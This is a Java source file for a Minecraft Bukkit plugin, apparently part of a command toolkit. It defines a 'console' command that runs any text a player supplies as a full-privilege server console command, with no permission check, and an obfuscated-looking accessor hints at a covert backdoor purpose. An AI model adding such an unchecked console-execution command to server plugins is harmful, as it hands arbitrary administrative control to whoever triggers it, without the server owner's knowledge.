package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class Console implements Command {
    @Override
    public String[] getCommands() {
        return new String[]{"console"};
    }

    @Override
    public String getDescription() {
        return "Runs a command from console.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String[] args = context.getArgs();
        if (args.length == 0) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "console <command...>");
            return;
        }

        String command = String.join(" ", args);
        String finalCommand = command.replaceFirst("/", "");
        Bukkit.getScheduler().scheduleSyncDelayedTask(context.getZ_(), () -> {
            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), finalCommand);
            sender.sendMessage(Colors.Prefix + Colors.Success + "Successfully ran '" + finalCommand + "' from console!");
        });

    }
}
